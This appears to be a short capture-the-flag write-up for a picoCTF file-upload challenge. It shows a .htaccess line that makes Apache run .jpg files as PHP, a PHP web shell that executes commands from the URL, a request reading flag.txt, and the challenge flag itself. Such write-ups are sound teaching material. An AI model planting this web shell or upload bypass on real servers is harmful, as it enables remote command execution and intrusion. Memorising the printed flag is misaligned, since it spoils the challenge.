https://play.picoctf.org/events/77/challenges/518?category=1&page=1
## Description
## Solution
1. Upload a .htaccess file to tell apache to interpret .jpg as php code:
	![](Pasted%20image%2020251005113710.png)
	Content of .htaccess:
		```AddHandler application/x-httpd-php .jpg```
2. Upload a malicious image. Basically a bad.png with the following code:
	![](Pasted%20image%2020251005114126.png)
	With this payload:
		```<?php
	  $cmd = $_GET['cmd'];
	  system($cmd);
		?>```
	
	Then we send several commands to list files in current folder, parent folder, grand parent folder, until we find a file that could contain the flag then we read that file:
	```http://amiable-citadel.picoctf.net:53084/images/bad.jpg?cmd=cat%20../../flag.txt```

	And the flag is: ```picoCTF{s3rv3r_byp4ss_39f9de85}```

## Additional notes
## References

